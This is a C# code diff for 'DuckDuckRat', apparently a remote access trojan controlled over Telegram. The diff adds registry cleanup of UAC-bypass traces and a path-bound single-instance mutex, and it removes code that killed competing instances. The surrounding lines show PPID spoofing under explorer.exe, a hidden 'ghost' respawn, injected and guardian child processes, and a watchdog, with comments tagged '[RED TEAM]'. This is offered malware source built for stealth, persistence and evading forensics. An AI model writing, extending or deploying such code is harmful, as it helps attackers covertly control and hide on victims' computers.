@@ -34,6 +34,24 @@ namespace DuckDuckRat
                 e.SetObserved();
             };
 
+            // [STEP 0] Proactive Registry Sanitization (Clean old indicators)
+            RegistryCleanup.SanitizeUacTraces();
+
+            // [STEP 1] Mutex Acquisition (Path-Specific to avoid Cross-Service Conflicts)
+            bool createdNew;
+            string mutexName = GetStableMutexName();
+            _mutex = new Mutex(true, mutexName, out createdNew);
+
+            if (!createdNew)
+            {
+                // [RED TEAM] Silent Backoff: Don't fight for the Telegram session if an instance is already active.
+                // This prevents the "Conflict: terminated by other getUpdates request" error.
+                DebugLog("Mutex conflict detected. Strategic backoff (5s)...");
+                Thread.Sleep(5000);
+                return; 
+            }
+            DebugLog($"Mutex acquired: {mutexName}.");
+
             // [GHOST] Self-Respawn with PPID Spoofing (explorer.exe)
             string cmdLine = Environment.CommandLine;
             bool isGhost = cmdLine.Contains("--ghost");
@@ -77,54 +95,15 @@ namespace DuckDuckRat
                 {
                     fromPid = gPid;
                     fromPath = parts[1];
-                    // On systems like Windows, paths might contain colons (C:\), so we rejoin if needed
                     if (parts.Length > 2) fromPath = string.Join(":", parts, 1, parts.Length - 1);
                 }
             }
 
-            if (!isInjected && guardianArg == null)
-            {
-                bool createdNew;
-                string mutexName = GetStableMutexName();
-                _mutex = new Mutex(true, mutexName, out createdNew);
-
-                if (!createdNew) 
-                {
-                    DebugLog("Mutex conflict: analyzing previous instances...");
-                    string currentName = Process.GetCurrentProcess().ProcessName;
-                    int currentId = Process.GetCurrentProcess().Id;
-                    bool currentIsAdmin = ElevationService.IsAdmin();
-
-                    foreach (var proc in Process.GetProcessesByName(currentName)) {
-                        if (proc.Id != currentId) {
-                            try { 
-                                // [PRO] Mutex Regicide Protection: Never kill an Admin process from a standard one.
-                                if (!currentIsAdmin && SafetyManager.IsProcessAdmin(proc.Id))
-                                {
-                                    DebugLog($"Existing instance {proc.Id} is ADMIN. Service instance protected. Exiting current process.");
-                                    return;
-                                }
-                                proc.Kill(true); 
-                                proc.WaitForExit(3000); 
-                            } catch { }
-                        }
-                    }
-                    Thread.Sleep(1000); 
-                    _mutex?.Dispose();
-                    _mutex = new Mutex(true, mutexName, out createdNew);
-                    if (!createdNew) {
-                        DebugLog("Failed to acquire mutex after cleanup. Exiting.");
-                        return;
-                    }
-                }
-                DebugLog($"Mutex acquired: {mutexName}.");
-            }
-            else
+            if (isInjected || guardianArg != null)
             {
                 DebugLog($"Running as {(isInjected ? "INJECTED" : "GUARDIAN")} child from PID {fromPid}.");
                 if (fromPid > 0) 
                 {
-                    // WatchdogManager now requires the path to the process it's guarding
                     WatchdogManager.Start(fromPid, fromPath);
                 }
             }
@@ -218,10 +197,10 @@ namespace DuckDuckRat
         private static string GetStableMutexName()
         {
             try {
-                string seed = Environment.MachineName + Environment.UserName;
-                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography")) {
-                    if (key != null) seed = key.GetValue("MachineGuid")?.ToString() ?? seed;
-                }
+                // [RED TEAM] Path-bound Mutex: prevents conflicts if multiple builds are running from different folders.
+                string path = Process.GetCurrentProcess().MainModule.FileName.ToLower();
+                string seed = Environment.MachineName + Environment.UserName + path;
+                
                 using var sha = System.Security.Cryptography.SHA256.Create();
                 byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(seed));
                 return "Global\\" + new Guid(hash.AsSpan(0, 16).ToArray()).ToString("B").ToUpper();
